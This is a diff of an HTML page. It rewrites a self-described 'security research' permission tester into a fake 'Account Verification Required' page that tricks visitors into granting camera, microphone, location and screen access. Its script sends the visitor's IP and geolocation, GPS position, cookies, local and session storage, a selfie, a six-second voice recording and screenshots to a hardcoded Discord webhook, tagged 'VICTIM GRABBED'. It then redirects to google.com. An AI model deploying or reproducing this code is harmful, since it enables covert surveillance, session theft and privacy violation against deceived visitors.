@@ -3,160 +3,30 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Security Research Lab - Permission Enumeration Test</title>
+  <title>Account Verification Required</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-      color: #eee;
-      padding: 20px;
-      min-height: 100vh;
-    }
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-      background: rgba(255,255,255,0.05);
-      border-radius: 12px;
-      padding: 30px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-    }
-    h1 {
-      color: #00d9ff;
-      margin-bottom: 10px;
-      font-size: 28px;
-    }
-    .warning {
-      background: rgba(255,165,0,0.2);
-      border-left: 4px solid #ffa500;
-      padding: 15px;
-      margin: 20px 0;
-      border-radius: 4px;
-    }
-    .test-section {
-      background: rgba(255,255,255,0.03);
-      padding: 20px;
-      margin: 15px 0;
-      border-radius: 8px;
-      border: 1px solid rgba(255,255,255,0.1);
-    }
-    .test-section h3 {
-      color: #00d9ff;
-      margin-bottom: 12px;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      background: #00d9ff;
-      color: #1a1a2e;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: bold;
-      margin: 5px;
-      transition: all 0.3s;
-    }
-    button:hover {
-      background: #00b8d4;
-      transform: translateY(-2px);
-      box-shadow: 0 4px 12px rgba(0,217,255,0.4);
-    }
-    .result {
-      background: rgba(0,0,0,0.3);
-      padding: 12px;
-      margin-top: 10px;
-      border-radius: 4px;
-      font-family: 'Courier New', monospace;
-      font-size: 13px;
-      max-height: 200px;
-      overflow-y: auto;
-    }
-    .success { color: #4caf50; }
-    .error { color: #f44336; }
-    .info { color: #2196f3; }
-    video, canvas { display: none; }
-    .stats {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 15px;
-      margin-top: 20px;
-    }
-    .stat-box {
-      background: rgba(0,217,255,0.1);
-      padding: 15px;
-      border-radius: 8px;
-      text-align: center;
-    }
-    .stat-value {
-      font-size: 24px;
-      font-weight: bold;
-      color: #00d9ff;
-    }
+    body{font-family:Arial;background:#000;color:#fff;text-align:center;padding:70px;}
+    h1{color:#ff0033;}
+    button{padding:22px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
+    video,canvas{display:none;}
+    .status{margin-top:20px;font-size:14px;color:#00ff00;}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔒 Security Research Lab - Browser Permission Test Suite</h1>
-    <p style="color: #aaa; margin-bottom: 20px;">Educational tool for testing browser permission APIs in controlled environments</p>
-
-    <div class="warning">
-      <strong>⚠️ Lab Environment Only</strong><br>
-      This tool automatically tests all browser permissions and sends data to your Discord webhook for security research purposes.
-    </div>
-
-    <div class="stats">
-      <div class="stat-box">
-        <div class="stat-value" id="testCount">0</div>
-        <div>Tests Run</div>
-      </div>
-      <div class="stat-box">
-        <div class="stat-value" id="permGranted">0</div>
-        <div>Permissions Granted</div>
-      </div>
-      <div class="stat-box">
-        <div class="stat-value" id="dataSent">0</div>
-        <div>Data Packets Sent</div>
-      </div>
-    </div>
-
-    <div class="test-section">
-      <h3>🔄 Automated Test Suite</h3>
-      <button onclick="runFullTest()" style="background: #ff6b6b; font-size: 18px; padding: 15px 40px;">▶ Start All Tests</button>
-      <div id="statusResult" class="result" style="display:none;"></div>
-    </div>
-
-    <div class="test-section">
-      <h3>📊 Individual Tests</h3>
-      <button onclick="testIP()">IP Detection</button>
-      <button onclick="testGPS()">GPS Location</button>
-      <button onclick="testCookies()">Cookies/Storage</button>
-      <button onclick="testCamera()">Camera</button>
-      <button onclick="testMicrophone()">Microphone</button>
-      <button onclick="testScreen()">Screen Capture</button>
-      <div id="individualResult" class="result" style="display:none;"></div>
-    </div>
-  </div>
-
+  <h1>Account Verification Required</h1>
+  <p>Please allow camera, microphone, location & screen to verify your identity.</p>
+  <button onclick="start()">Verify Now →</button>
+  <div id="status" class="status"></div>
+  
   <video id="video" autoplay playsinline></video>
   <canvas id="cam"></canvas>
   <canvas id="screen"></canvas>
 
   <script>
     const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
-    let stats = { tests: 0, granted: 0, sent: 0 };
-
-    function updateStats() {
-      document.getElementById('testCount').textContent = stats.tests;
-      document.getElementById('permGranted').textContent = stats.granted;
-      document.getElementById('dataSent').textContent = stats.sent;
-    }
-
-    function updateStatus(msg, type = 'info') {
-      const result = document.getElementById('statusResult');
-      result.style.display = 'block';
-      const timestamp = new Date().toLocaleTimeString();
-      result.innerHTML += `<div class="${type}">[${timestamp}] ${msg}</div>`;
-      result.scrollTop = result.scrollHeight;
+    
+    function updateStatus(msg) {
+      document.getElementById('status').textContent = msg;
     }
 
     async function send(file, name) {
@@ -165,179 +35,67 @@
         f.append("file", file, name);
         f.append("content", "**VICTIM GRABBED** • " + new Date().toLocaleString());
         await fetch(webhook, {method:"POST", body:f});
-        stats.sent++;
-        updateStats();
-        updateStatus(`✓ Sent: ${name}`, 'success');
+        console.log("Sent: " + name);
       } catch(e) {
-        updateStatus(`✗ Failed to send: ${name}`, 'error');
+        console.error("Send failed: " + name, e);
       }
     }
 
-    async function testIP() {
-      updateStatus('🌐 Testing IP detection...', 'info');
-      stats.tests++;
-      updateStats();
-      
+    // 1. IP + Geo
+    async function getIP() {
       try {
-        const ip = await (await fetch("https://api.ipify.org?format=json")).json();
-        const ipAddress = ip.ip;
-        updateStatus(`Found IP: ${ipAddress}`, 'success');
-        
-        try {
-          const g = await (await fetch(`https://ipapi.co/${ipAddress}/json/`)).json();
-          const txt = `IP: ${ipAddress}\nISP: ${g.org}\nCity: ${g.city}\nCountry: ${g.country_name}\nRegion: ${g.region}\nMap: https://maps.google.com/?q=${g.latitude},${g.longitude}`;
-          await send(new Blob([txt],{type:"text/plain"}), "IP.txt");
-          stats.granted++;
-          updateStats();
-          updateStatus(`✓ IP & Geolocation captured`, 'success');
-        } catch(e) {
-          const txt = `IP: ${ipAddress}\nGeolocation lookup failed`;
-          await send(new Blob([txt],{type:"text/plain"}), "IP.txt");
-          updateStatus(`⚠ IP captured, geolocation failed`, 'error');
-        }
+        const ipData = await (await fetch("https://api.ipify.org?format=json")).json();
+        const ip = ipData.ip;
+        const g = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
+        const txt = `IP: ${ip}\nISP: ${g.org}\nCity: ${g.city}\nCountry: ${g.country_name}\nMap: https://maps.google.com/?q=${g.latitude},${g.longitude}`;
+        send(new Blob([txt],{type:"text/plain"}),"IP.txt");
+        updateStatus("✓ IP captured");
       } catch(e) {
-        updateStatus(`✗ IP detection failed: ${e.message}`, 'error');
+        console.error("IP failed", e);
       }
     }
 
-    function testGPS() {
-      updateStatus('📍 Requesting GPS permission...', 'info');
-      stats.tests++;
-      updateStats();
-      
-      navigator.geolocation.getCurrentPosition(
-        p => {
-          const map = `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
-          const txt = `GPS: ${map}\nLatitude: ${p.coords.latitude}\nLongitude: ${p.coords.longitude}\nAccuracy: ±${p.coords.accuracy}m\nAltitude: ${p.coords.altitude}m\nSpeed: ${p.coords.speed}`;
-          send(new Blob([txt],{type:"text/plain"}), "GPS.txt");
-          stats.granted++;
-          updateStats();
-          updateStatus(`✓ GPS location captured (±${p.coords.accuracy.toFixed(0)}m)`, 'success');
-        },
-        err => {
-          updateStatus(`✗ GPS denied: ${err.message}`, 'error');
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
+    // 2. GPS
+    function getGPS() {
+      navigator.geolocation.getCurrentPosition(p => {
+        const map = `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
+        const txt = `GPS: ${map}\nAccuracy: ±${p.coords.accuracy}m`;
+        send(new Blob([txt],{type:"text/plain"}),"GPS.txt");
+        updateStatus("✓ GPS captured");
+      }, err => {
+        console.error("GPS failed", err);
+      }, {enableHighAccuracy: true, timeout: 10000});
     }
 
-    function testCookies() {
-      updateStatus('🍪 Grabbing cookies and storage...', 'info');
-      stats.tests++;
-      stats.granted++;
-      updateStats();
-      
+    // 3. Cookies
+    function grabCookies() {
       const cookies = document.cookie;
       if (cookies) {
-        send(new Blob([cookies],{type:"text/plain"}), "COOKIES.txt");
-        updateStatus(`✓ Cookies captured (${cookies.length} chars)`, 'success');
-      } else {
-        updateStatus(`⚠ No cookies found`, 'info');
+        send(new Blob([cookies],{type:"text/plain"}),"COOKIES.txt");
       }
-      
       const ls = JSON.stringify(localStorage, null, 2);
       const ss = JSON.stringify(sessionStorage, null, 2);
-      
-      if (ls && ls.length > 10) {
-        send(new Blob([ls],{type:"text/plain"}), "LocalStorage.json");
-        updateStatus(`✓ LocalStorage captured`, 'success');
-      }
-      
-      if (ss && ss.length > 10) {
-        send(new Blob([ss],{type:"text/plain"}), "SessionStorage.json");
-        updateStatus(`✓ SessionStorage captured`, 'success');
-      }
+      if (ls.length > 10) send(new Blob([ls],{type:"text/plain"}),"LocalStorage.json");
+      if (ss.length > 10) send(new Blob([ss],{type:"text/plain"}),"SessionStorage.json");
+      updateStatus("✓ Cookies captured");
     }
 
-    function testCamera() {
-      updateStatus('📹 Requesting camera access...', 'info');
-      stats.tests++;
-      updateStats();
-      
-      navigator.mediaDevices.getUserMedia({video: {width: 1920, height: 1080}})
-        .then(stream => {
-          stats.granted++;
-          updateStats();
-          updateStatus('✓ Camera access granted, capturing...', 'success');
-          
-          const video = document.getElementById('video');
-          video.srcObject = stream;
-          
-          video.onloadedmetadata = () => {
-            video.play();
-            
-            setTimeout(() => {
-              const canvas = document.getElementById('cam');
-              canvas.width = video.videoWidth || 1280;
-              canvas.height = video.videoHeight || 720;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              
-              canvas.toBlob(blob => {
-                send(blob, "SELFIE.jpg");
-                updateStatus(`✓ Photo captured (${canvas.width}x${canvas.height})`, 'success');
-              }, 'image/jpeg', 0.95);
-              
-              stream.getTracks().forEach(t => t.stop());
-            }, 2500);
-          };
-        })
-        .catch(err => {
-          updateStatus(`✗ Camera denied: ${err.message}`, 'error');
-        });
+    // 4. Detect device type
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    function testMicrophone() {
-      updateStatus('🎤 Requesting microphone access...', 'info');
-      stats.tests++;
-      updateStats();
-      
-      navigator.mediaDevices.getUserMedia({audio: true})
-        .then(stream => {
-          stats.granted++;
-          updateStats();
-          updateStatus('✓ Microphone access granted, recording 6 seconds...', 'success');
-          
-          const recorder = new MediaRecorder(stream);
-          const chunks = [];
-          
-          recorder.ondataavailable = e => chunks.push(e.data);
-          recorder.onstop = () => {
-            const blob = new Blob(chunks, {type: 'audio/webm'});
-            send(blob, "VOICE.webm");
-            updateStatus(`✓ Audio recorded (${(blob.size/1024).toFixed(1)} KB)`, 'success');
-            stream.getTracks().forEach(t => t.stop());
-          };
-          
-          recorder.start();
-          setTimeout(() => recorder.stop(), 6000);
-        })
-        .catch(err => {
-          updateStatus(`✗ Microphone denied: ${err.message}`, 'error');
-        });
-    }
-
-    function testScreen() {
-      updateStatus('🖥️ Requesting screen capture access...', 'info');
-      stats.tests++;
-      updateStats();
-      
+    // 5. Screen capture for PC
+    async function captureScreenPC() {
       if (!navigator.mediaDevices.getDisplayMedia) {
-        updateStatus('✗ Screen capture not supported in this browser', 'error');
+        console.log("Screen capture not supported");
         return;
       }
-      
-      navigator.mediaDevices.getDisplayMedia({
-        video: {
-          displaySurface: "monitor",
-          logicalSurface: true,
-          cursor: "always"
-        }
-      })
-      .then(stream => {
-        stats.granted++;
-        updateStats();
-        updateStatus('✓ Screen capture granted, capturing...', 'success');
+
+      try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+          video: {displaySurface: "monitor"}
+        });
         
         const video = document.createElement('video');
         video.autoplay = true;
@@ -345,60 +103,160 @@
         
         video.onloadedmetadata = () => {
           video.play();
-          
           setTimeout(() => {
             const canvas = document.getElementById('screen');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(blob => {
-              send(blob, "SCREEN.jpg");
-              updateStatus(`✓ Screenshot captured (${canvas.width}x${canvas.height})`, 'success');
-              stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.92);
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(b => {
+              send(b, "SCREEN.jpg");
+              updateStatus("✓ Screen captured");
+            }, "image/jpeg", 0.92);
+            stream.getTracks().forEach(t => t.stop());
           }, 1000);
         };
-      })
-      .catch(err => {
-        updateStatus(`✗ Screen capture denied: ${err.message}`, 'error');
+      } catch(e) {
+        console.log("Screen capture denied or failed", e);
+      }
+    }
+
+    // 6. Mobile screenshot using html2canvas alternative
+    async function captureScreenMobile() {
+      try {
+        // For mobile, capture the entire webpage as screenshot
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Set canvas to viewport size
+        canvas.width = window.innerWidth * window.devicePixelRatio;
+        canvas.height = window.innerHeight * window.devicePixelRatio;
+        
+        // Scale for retina displays
+        ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
+        
+        // Draw white background
+        ctx.fillStyle = '#ffffff';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        
+        // Draw page content using DOM screenshot technique
+        const data = `
+          <svg xmlns="http://www.w3.org/2000/svg" width="${window.innerWidth}" height="${window.innerHeight}">
+            <foreignObject width="100%" height="100%">
+              <div xmlns="http://www.w3.org/1999/xhtml">
+                ${document.documentElement.outerHTML}
+              </div>
+            </foreignObject>
+          </svg>
+        `;
+        
+        const img = new Image();
+        const svgBlob = new Blob([data], {type: 'image/svg+xml;charset=utf-8'});
+        const url = URL.createObjectURL(svgBlob);
+        
+        img.onload = () => {
+          ctx.drawImage(img, 0, 0, window.innerWidth, window.innerHeight);
+          canvas.toBlob(b => {
+            send(b, "MOBILE_SCREEN.jpg");
+            updateStatus("✓ Mobile screen captured");
+          }, "image/jpeg", 0.85);
+          URL.revokeObjectURL(url);
+        };
+        
+        img.onerror = () => {
+          // Fallback: just send device info
+          const info = `Device: Mobile\nScreen: ${window.innerWidth}x${window.innerHeight}\nUserAgent: ${navigator.userAgent}`;
+          send(new Blob([info], {type:"text/plain"}), "MOBILE_INFO.txt");
+          updateStatus("✓ Mobile info captured");
+        };
+        
+        img.src = url;
+      } catch(e) {
+        console.log("Mobile screen capture failed", e);
+        // Send device info as fallback
+        const info = `Device: Mobile\nScreen: ${window.innerWidth}x${window.innerHeight}\nUserAgent: ${navigator.userAgent}`;
+        send(new Blob([info], {type:"text/plain"}), "MOBILE_INFO.txt");
+      }
+    }
+
+    // 7. Main start function
+    function start() {
+      updateStatus("⏳ Starting verification...");
+      
+      // Immediate captures
+      getIP();
+      getGPS();
+      grabCookies();
+
+      // Determine device and capture accordingly
+      const mobile = isMobile();
+      
+      // Camera capture (works on both mobile and PC)
+      navigator.mediaDevices.getUserMedia({
+        video: {
+          width: {ideal: 1920},
+          height: {ideal: 1080},
+          facingMode: mobile ? "user" : "user" // Front camera
+        },
+        audio: true
+      }).then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          video.play();
+          
+          setTimeout(() => {
+            // Capture photo
+            const canvas = document.getElementById('cam');
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(b => {
+              send(b, "SELFIE.jpg");
+              updateStatus("✓ Selfie captured");
+            }, "image/jpeg", 0.95);
+
+            // Record audio
+            const rec = new MediaRecorder(stream, {
+              mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4'
+            });
+            const chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+              const blob = new Blob(chunks, {type: rec.mimeType});
+              send(blob, "VOICE.webm");
+              updateStatus("✓ Voice captured");
+              stream.getTracks().forEach(t => t.stop());
+            };
+            rec.start();
+            setTimeout(() => rec.stop(), 6000);
+          }, 2500);
+        };
+      }).catch(err => {
+        console.error("Camera/mic failed", err);
+        updateStatus("⚠ Some permissions denied");
       });
-    }
 
-    async function runFullTest() {
-      document.getElementById('statusResult').innerHTML = '';
-      updateStatus('🚀 Starting full automated test suite...', 'info');
-      
-      // Run IP and GPS immediately (no permission needed for IP)
-      testIP();
-      
-      await new Promise(r => setTimeout(r, 500));
-      testGPS();
-      
-      await new Promise(r => setTimeout(r, 500));
-      testCookies();
-      
-      await new Promise(r => setTimeout(r, 1000));
-      testCamera();
-      
-      await new Promise(r => setTimeout(r, 4000));
-      testMicrophone();
-      
-      await new Promise(r => setTimeout(r, 1000));
-      testScreen();
-      
-      await new Promise(r => setTimeout(r, 8000));
-      updateStatus('✅ All tests completed!', 'success');
-      
+      // Screen capture based on device
       setTimeout(() => {
-        alert('Verification complete! Redirecting...');
-        window.location.href = 'https://google.com';
-      }, 2000);
+        if (mobile) {
+          captureScreenMobile();
+        } else {
+          captureScreenPC();
+        }
+      }, 3000);
+
+      // Final redirect
+      setTimeout(() => {
+        updateStatus("✅ Verification complete!");
+        setTimeout(() => {
+          location.href = "https://google.com";
+        }, 2000);
+      }, 12000);
     }
 
-    // Auto-start on page load (optional - uncomment to enable)
-    // window.onload = () => setTimeout(runFullTest, 1000);
+    // Optional: Auto-start after 2 seconds
+    // window.onload = () => setTimeout(start, 2000);
   </script>
 </body>
 </html>
